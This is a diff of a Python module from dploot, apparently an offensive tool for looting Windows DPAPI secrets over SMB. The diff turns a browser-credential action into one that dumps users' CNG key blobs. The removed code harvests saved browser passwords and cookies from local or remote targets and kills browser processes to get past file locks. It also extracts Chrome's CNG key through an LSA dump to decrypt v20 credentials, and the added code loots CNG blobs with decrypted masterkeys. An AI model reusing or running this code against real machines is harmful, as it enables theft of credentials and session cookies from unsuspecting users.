@@ -2,22 +2,18 @@ import argparse
 import logging
 import sys
 from typing import Callable, Tuple
-from dploot.action.masterkeys import (
-    add_masterkeys_argument_group,
-    parse_masterkeys_options,
-)
 
+from dploot.action.masterkeys import add_masterkeys_argument_group, parse_masterkeys_options
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
-from dploot.triage.browser import BrowserTriage, Cookie
 from dploot.triage.cng import CngTriage
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 
-NAME = "browser"
 
+NAME = "cng"
 
-class BrowserAction:
+class CngAction:
     def __init__(self, options: argparse.Namespace) -> None:
         self.options = options
         self.target = Target.from_options(options)
@@ -77,55 +73,24 @@ class BrowserAction:
                 )
                 logging.info("Triage ALL USERS masterkeys\n")
                 self.masterkeys = masterkeytriage.triage_masterkeys()
-                if self.options.v20support:
-                    self.masterkeys += masterkeytriage.triage_system_masterkeys()
                 print()
                 if self.outputdir is not None:
                     dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)
 
-            if self.options.kill_browser:
-                logging.info("Killing browsers")
-                for browser_process_name in ["chrome.exe", "msedge.exe", "brave.exe"]:
-                    self.conn.perform_taskkill(process_name=browser_process_name)
-
-            def secret_callback(secret):
-                if not self.options.show_cookies and isinstance(secret, Cookie):
-                    return
+            def cng_callback(cng):
                 if self.options.quiet:
-                    secret.dump_quiet()
+                    cng.dump_quiet()
                 else:
-                    secret.dump()
+                    cng.dump()
 
-            cng_chromekey = None
-
-            if self.options.v20support:
-                triage = CngTriage(
-                    target=self.target,
-                    conn=self.conn,
-                    masterkeys=self.masterkeys,
-                )
-                logging.info("Triage SYSTEM CNG files\n")
-
-                for cng_file in triage.triage_system_cng():
-                    if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
-                            logging.info("Found CNG Google ChromeKey1\n")
-                            cng_chromekey = cng_file.decrypted_private_key
-
-            triage = BrowserTriage(
+            triage = CngTriage(
                 target=self.target,
                 conn=self.conn,
                 masterkeys=self.masterkeys,
-                per_secret_callback=secret_callback,
+                per_cng_callback=cng_callback,
             )
-            logging.info(
-                "Triage Browser Credentials%sfor ALL USERS\n"
-                % (" and Cookies " if self.options.show_cookies else " ")
-            )
-            triage.triage_browsers(
-                gather_cookies=self.options.show_cookies,
-                cng_chromekey=cng_chromekey,
-                bypass_shared_violation=self.options.bypass_shared_violation,
-            )
+            logging.info("Triage CNG files for ALL USERS\n")
+            triage.triage_cng()
             if self.outputdir is not None:
                 dump_looted_files_to_disk(self.outputdir, triage.looted_files)
         else:
@@ -138,20 +103,19 @@ class BrowserAction:
 
         self._is_admin = self.conn.is_admin()
         return self._is_admin
-
+    
 
 def entry(options: argparse.Namespace) -> None:
-    a = BrowserAction(options)
+    a = CngAction(options)
     a.run()
 
 
 def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
     subparser = subparsers.add_parser(
-        NAME,
-        help="Dump users credentials and cookies saved in browser from local or remote target",
+        NAME, help="Dump users CNG files blob from local or remote target"
     )
 
-    group = subparser.add_argument_group("browser options")
+    group = subparser.add_argument_group("cng options")
 
     group.add_argument(
         "-mkfile",
@@ -160,33 +124,6 @@ def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable
     )
 
     add_masterkeys_argument_group(group)
-
-    group.add_argument(
-        "-show-cookies",
-        action="store_true",
-        help=("Output dumped cookies from browsers"),
-    )
-
-    group.add_argument(
-        "-bypass-shared-violation",
-        action="store_true",
-        help=("Will try to bypass Shared Violation Error with a silly esentutl trick"),
-    )
-
-    group.add_argument(
-        "-v20support",
-        action="store_true",
-        help=("Will dump v20 chromium credentials (will perform a LSA dump in form of reg save)"),
-    )
-
-    group.add_argument(
-        "-kill-browser",
-        action="store_true",
-        help=(
-            "Will try to kill browser's process. Usefull when Shared Violation Error"
-        ),
-    )
-
     add_target_argument_group(subparser)
 
     return NAME, entry
